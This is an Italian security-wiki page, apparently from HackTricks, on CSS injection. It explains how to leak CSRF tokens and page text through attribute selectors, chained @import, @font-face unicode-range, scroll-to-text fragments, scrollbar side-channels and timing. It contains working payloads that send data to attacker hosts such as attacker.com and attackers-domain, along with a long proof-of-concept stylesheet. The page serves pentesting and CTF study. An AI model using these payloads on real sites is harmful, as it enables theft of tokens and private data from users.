# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Selettore di Attributo

I selettori CSS sono progettati per corrispondere ai valori degli attributi `name` e `value` di un elemento `input`. Se l'attributo value dell'elemento input inizia con un carattere specifico, viene caricato una risorsa esterna predefinita:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Tuttavia, questo approccio presenta una limitazione quando si tratta di elementi di input nascosti (`type="hidden"`) perché gli elementi nascosti non caricano sfondi.

#### Bypass per Elementi Nascosti

Per aggirare questa limitazione, puoi mirare a un elemento fratello successivo utilizzando il combinatore di fratelli generali `~`. La regola CSS si applica quindi a tutti i fratelli che seguono l'elemento di input nascosto, causando il caricamento dell'immagine di sfondo:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Un esempio pratico di sfruttamento di questa tecnica è dettagliato nel frammento di codice fornito. Puoi visualizzarlo [qui](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Requisiti per l'iniezione CSS

Affinché la tecnica di iniezione CSS sia efficace, devono essere soddisfatte determinate condizioni:

1. **Lunghezza del Payload**: Il vettore di iniezione CSS deve supportare payload sufficientemente lunghi per contenere i selettori creati.
2. **Rivalutazione CSS**: Dovresti avere la possibilità di incorniciare la pagina, il che è necessario per attivare la rivalutazione del CSS con payload generati di recente.
3. **Risorse Esterne**: La tecnica presuppone la possibilità di utilizzare immagini ospitate esternamente. Questo potrebbe essere limitato dalla Content Security Policy (CSP) del sito.

### Selettore di Attributo Cieco

Come [**spiegato in questo post**](https://portswigger.net/research/blind-css-exfiltration), è possibile combinare i selettori **`:has`** e **`:not`** per identificare contenuti anche da elementi ciechi. Questo è molto utile quando non hai idea di cosa ci sia all'interno della pagina web che carica l'iniezione CSS.\
È anche possibile utilizzare quei selettori per estrarre informazioni da diversi blocchi dello stesso tipo come in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combinando questo con la seguente tecnica **@import**, è possibile esfiltrare molte **info utilizzando l'iniezione CSS da pagine cieche con** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

La tecnica precedente ha alcuni svantaggi, controlla i requisiti. Devi essere in grado di **inviare più link alla vittima**, oppure devi essere in grado di **iframe la pagina vulnerabile all'iniezione CSS**.

Tuttavia, c'è un'altra tecnica ingegnosa che utilizza **CSS `@import`** per migliorare la qualità della tecnica.

Questo è stato mostrato per la prima volta da [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) e funziona in questo modo:

Invece di caricare la stessa pagina più e più volte con decine di payload diversi ogni volta (come nella precedente), caricheremo **la pagina solo una volta e solo con un import al server dell'attaccante** (questo è il payload da inviare alla vittima):
```css
@import url("//attacker.com:5001/start?");
```
1. L'importazione andrà a **ricevere uno script CSS** dagli attaccanti e il **browser lo caricherà**.
2. La prima parte dello script CSS che l'attaccante invierà è **un altro `@import` al server degli attaccanti di nuovo.**
1. Il server degli attaccanti non risponderà a questa richiesta ancora, poiché vogliamo rivelare alcuni caratteri e poi rispondere a questo import con il payload per rivelare i successivi.
3. La seconda e più grande parte del payload sarà un **payload di leak del selettore di attributi**
1. Questo invierà al server degli attaccanti il **primo carattere del segreto e l'ultimo**
4. Una volta che il server degli attaccanti ha ricevuto il **primo e l'ultimo carattere del segreto**, risponderà **all'import richiesto nel passo 2**.
1. La risposta sarà esattamente la stessa dei **passi 2, 3 e 4**, ma questa volta cercherà di **trovare il secondo carattere del segreto e poi il penultimo**.

L'attaccante **seguirà quel ciclo fino a riuscire a rivelare completamente il segreto**.

Puoi trovare il [**codice originale di Pepe Vila per sfruttare questo qui**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) o puoi trovare quasi lo [**stesso codice ma commentato qui**.](./#css-injection)

> [!NOTE]
> Lo script cercherà di scoprire 2 caratteri ogni volta (dall'inizio e dalla fine) perché il selettore di attributi consente di fare cose come:
>
> ```css
> /* value^=  per abbinare l'inizio del valore*/
> input[value^="0"] {
>   --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  per abbinare la fine del valore*/
> input[value$="f"] {
>   --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Questo consente allo script di rivelare il segreto più velocemente.

> [!WARNING]
> A volte lo script **non rileva correttamente che il prefisso + suffisso scoperto è già la flag completa** e continuerà in avanti (nel prefisso) e indietro (nel suffisso) e a un certo punto si bloccherà.\
> Non preoccuparti, controlla semplicemente l'**output** perché **puoi vedere la flag lì**.

### Altri selettori

Altri modi per accedere a parti del DOM con **selettori CSS**:

- **`.class-to-search:nth-child(2)`**: Questo cercherà il secondo elemento con classe "class-to-search" nel DOM.
- **`:empty`** selettore: Usato ad esempio in [**questo writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### XS-Search basato su errori

**Riferimento:** [Attacco basato su CSS: Abusare di unicode-range di @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC di @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

L'intenzione generale è di **utilizzare un font personalizzato da un endpoint controllato** e garantire che **il testo (in questo caso, 'A') venga visualizzato con questo font solo se la risorsa specificata (`favicon.ico`) non può essere caricata**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Utilizzo di Font Personalizzati**:

- Un font personalizzato è definito utilizzando la regola `@font-face` all'interno di un tag `<style>` nella sezione `<head>`.
- Il font è chiamato `poc` ed è recuperato da un endpoint esterno (`http://attacker.com/?leak`).
- La proprietà `unicode-range` è impostata su `U+0041`, mirata al carattere Unicode specifico 'A'.

2. **Elemento Object con Testo di Riserva**:
- Un elemento `<object>` con `id="poc0"` è creato nella sezione `<body>`. Questo elemento cerca di caricare una risorsa da `http://192.168.0.1/favicon.ico`.
- La `font-family` per questo elemento è impostata su `'poc'`, come definito nella sezione `<style>`.
- Se la risorsa (`favicon.ico`) non riesce a caricarsi, il contenuto di riserva (la lettera 'A') all'interno del tag `<object>` viene visualizzato.
- Il contenuto di riserva ('A') verrà reso utilizzando il font personalizzato `poc` se la risorsa esterna non può essere caricata.

### Stile Scroll-to-Text Fragment

La **`:target`** pseudo-classe è impiegata per selezionare un elemento mirato da un **frammento URL**, come specificato nella [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). È fondamentale comprendere che `::target-text` non corrisponde a nessun elemento a meno che il testo non sia esplicitamente mirato dal frammento.

Sorge una preoccupazione per la sicurezza quando gli attaccanti sfruttano la funzionalità **Scroll-to-text** fragment, consentendo loro di confermare la presenza di testo specifico su una pagina web caricando una risorsa dal loro server tramite iniezione HTML. Il metodo prevede l'iniezione di una regola CSS come questa:
```css
:target::before {
content: url(target.png);
}
```
In tali scenari, se il testo "Administrator" è presente sulla pagina, la risorsa `target.png` viene richiesta dal server, indicando la presenza del testo. Un'istanza di questo attacco può essere eseguita tramite un URL appositamente creato che incorpora il CSS iniettato insieme a un frammento Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Qui, l'attacco manipola l'iniezione HTML per trasmettere il codice CSS, mirando al testo specifico "Administrator" attraverso il frammento Scroll-to-text (`#:~:text=Administrator`). Se il testo viene trovato, la risorsa indicata viene caricata, segnalando involontariamente la sua presenza all'attaccante.

Per la mitigazione, si devono notare i seguenti punti:

1. **Corrispondenza STTF Constrainata**: Il frammento Scroll-to-text (STTF) è progettato per corrispondere solo a parole o frasi, limitando così la sua capacità di rivelare segreti o token arbitrari.
2. **Restrizione ai Contesti di Navigazione di Livello Superiore**: Lo STTF opera esclusivamente nei contesti di navigazione di livello superiore e non funziona all'interno di iframe, rendendo qualsiasi tentativo di sfruttamento più evidente per l'utente.
3. **Necessità di Attivazione da Parte dell'Utente**: Lo STTF richiede un gesto di attivazione da parte dell'utente per funzionare, il che significa che gli sfruttamenti sono fattibili solo attraverso navigazioni avviate dall'utente. Questo requisito riduce notevolmente il rischio che gli attacchi vengano automatizzati senza interazione dell'utente. Tuttavia, l'autore del post del blog sottolinea condizioni specifiche e bypass (ad esempio, ingegneria sociale, interazione con estensioni di browser prevalenti) che potrebbero facilitare l'automazione dell'attacco.

Essere consapevoli di questi meccanismi e delle potenziali vulnerabilità è fondamentale per mantenere la sicurezza web e proteggere contro tali tattiche sfruttative.

Per ulteriori informazioni, controlla il rapporto originale: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Puoi controllare un [**exploit che utilizza questa tecnica per un CTF qui**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Puoi specificare **font esterni per valori unicode specifici** che saranno **raccolti solo se quei valori unicode sono presenti** nella pagina. Ad esempio:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
Quando accedi a questa pagina, Chrome e Firefox recuperano "?A" e "?B" perché il nodo di testo di sensitive-information contiene i caratteri "A" e "B". Ma Chrome e Firefox non recuperano "?C" perché non contiene "C". Questo significa che siamo stati in grado di leggere "A" e "B".

### Estrazione del nodo di testo (I): legature <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Riferimento:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

La tecnica descritta implica l'estrazione di testo da un nodo sfruttando le legature dei caratteri e monitorando i cambiamenti di larghezza. Il processo coinvolge diversi passaggi:

1. **Creazione di font personalizzati**:

- I font SVG sono creati con glifi che hanno un attributo `horiz-adv-x`, che imposta una grande larghezza per un glifo che rappresenta una sequenza di due caratteri.
- Esempio di glifo SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, dove "XY" denota una sequenza di due caratteri.
- Questi font vengono poi convertiti in formato woff utilizzando fontforge.

2. **Rilevamento dei cambiamenti di larghezza**:

- Viene utilizzato CSS per garantire che il testo non vada a capo (`white-space: nowrap`) e per personalizzare lo stile della barra di scorrimento.
- L'apparizione di una barra di scorrimento orizzontale, stilizzata in modo distintivo, funge da indicatore (oracolo) che una specifica legatura, e quindi una specifica sequenza di caratteri, è presente nel testo.
- Il CSS coinvolto:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Processo di sfruttamento**:

- **Passo 1**: Vengono creati font per coppie di caratteri con larghezza sostanziale.
- **Passo 2**: Viene impiegato un trucco basato sulla barra di scorrimento per rilevare quando il glifo di grande larghezza (legatura per una coppia di caratteri) viene reso, indicando la presenza della sequenza di caratteri.
- **Passo 3**: Una volta rilevata una legatura, vengono generati nuovi glifi che rappresentano sequenze di tre caratteri, incorporando la coppia rilevata e aggiungendo un carattere precedente o successivo.
- **Passo 4**: Viene effettuata la rilevazione della legatura di tre caratteri.
- **Passo 5**: Il processo si ripete, rivelando progressivamente l'intero testo.

4. **Ottimizzazione**:
- Il metodo di inizializzazione attuale che utilizza `<meta refresh=...` non è ottimale.
- Un approccio più efficiente potrebbe coinvolgere il trucco CSS `@import`, migliorando le prestazioni dello sfruttamento.

### Estrazione del nodo di testo (II): fuga del charset con un font predefinito (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Questo trucco è stato rilasciato in questo [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). Il charset utilizzato in un nodo di testo può essere rivelato **utilizzando i font predefiniti** installati nel browser: non sono necessari font esterni -o personalizzati-.

Il concetto ruota attorno all'utilizzo di un'animazione per espandere progressivamente la larghezza di un `div`, consentendo a un carattere alla volta di passare dalla parte 'suffisso' del testo alla parte 'prefisso'. Questo processo divide efficacemente il testo in due sezioni:

1. **Prefisso**: La riga iniziale.
2. **Suffisso**: La/e riga/e successiva/e.

Le fasi di transizione dei caratteri apparirebbero come segue:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Durante questa transizione, viene impiegato il **trucco unicode-range** per identificare ogni nuovo carattere mentre si unisce al prefisso. Questo viene realizzato cambiando il font in Comic Sans, che è notevolmente più alto del font predefinito, attivando così una barra di scorrimento verticale. L'apparizione di questa barra di scorrimento rivela indirettamente la presenza di un nuovo carattere nel prefisso.

Sebbene questo metodo consenta la rilevazione di caratteri unici man mano che appaiono, non specifica quale carattere è ripetuto, solo che è avvenuta una ripetizione.

> [!NOTE]
> Fondamentalmente, il **unicode-range viene utilizzato per rilevare un carattere**, ma poiché non vogliamo caricare un font esterno, dobbiamo trovare un altro modo.\
> Quando il **carattere** è **trovato**, gli viene **assegnato** il **font Comic Sans** preinstallato, che **rende** il carattere **più grande** e **attiva una barra di scorrimento** che **rivelerà il carattere trovato**.

Controlla il codice estratto dal PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Questo è menzionato come [una soluzione non riuscita in questo writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Questo caso è molto simile al precedente, tuttavia, in questo caso l'obiettivo di rendere specifici **chars più grandi di altri è nascondere qualcosa** come un pulsante da non premere da parte del bot o un'immagine che non verrà caricata. Quindi potremmo misurare l'azione (o la mancanza di azione) e sapere se un char specifico è presente all'interno del testo.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Questo è menzionato come [una soluzione non riuscita in questo writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso, potremmo provare a leakare se un char è nel testo caricando un font falso dalla stessa origine:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Se c'è una corrispondenza, il **font verrà caricato da `/static/bootstrap.min.css?q=1`**. Anche se non verrà caricato con successo, il **browser dovrebbe memorizzarlo nella cache**, e anche se non c'è cache, c'è un meccanismo di **304 not modified**, quindi la **risposta dovrebbe essere più veloce** rispetto ad altre cose.

Tuttavia, se la differenza di tempo della risposta memorizzata nella cache rispetto a quella non memorizzata non è abbastanza grande, questo non sarà utile. Ad esempio, l'autore ha menzionato: Tuttavia, dopo aver testato, ho scoperto che il primo problema è che la velocità non è molto diversa, e il secondo problema è che il bot utilizza il flag `disk-cache-size=1`, il che è davvero pensato.

### Estrazione del nodo di testo (III): perdita del charset caricando centinaia di "font" locali (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo è menzionato come [una soluzione non riuscita in questo writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso puoi indicare **CSS per caricare centinaia di font falsi** dalla stessa origine quando si verifica una corrispondenza. In questo modo puoi **misurare il tempo** che ci vuole e scoprire se un carattere appare o meno con qualcosa come:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
E il codice del bot appare così:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Quindi, se il font non corrisponde, il tempo di risposta quando si visita il bot dovrebbe essere di circa 30 secondi. Tuttavia, se c'è una corrispondenza del font, verranno inviati più richieste per recuperare il font, causando un'attività continua nella rete. Di conseguenza, ci vorrà più tempo per soddisfare la condizione di arresto e ricevere la risposta. Pertanto, il tempo di risposta può essere utilizzato come indicatore per determinare se c'è una corrispondenza del font.

## Riferimenti

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{{#include ../../../banners/hacktricks-training.md}}
